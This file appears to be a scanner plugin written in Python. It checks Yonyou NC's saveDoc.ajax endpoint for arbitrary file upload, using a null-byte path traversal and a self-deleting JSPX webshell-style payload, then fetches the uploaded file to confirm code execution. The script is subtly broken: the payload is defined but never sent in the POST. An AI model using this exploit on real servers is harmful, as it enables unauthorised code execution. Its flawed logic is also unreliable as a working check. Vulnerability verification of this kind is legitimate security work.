import requests
import urllib

from inc.generate_random import generate_random_str


def verify(url):
    relsult = {
        'name': '用友NC-saveDoc.ajax存在任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = '''content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
          <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
       <hi:scriptlet>
                out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); 
       </hi:scriptlet>
    </hi>'''
    char = generate_random_str(6)
    vurl = urllib.parse.urljoin(url, f"/uapws/saveDoc.ajax?ws=/../../{char}.jspx%00")
    try:
        response = requests.post(vurl, headers=headers)
        if response.status_code == 200:
            vurl = url + f'/uapws/{char}.jspx'
            response = requests.get(vurl)
            if response.status_code == 200 and 'World!' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult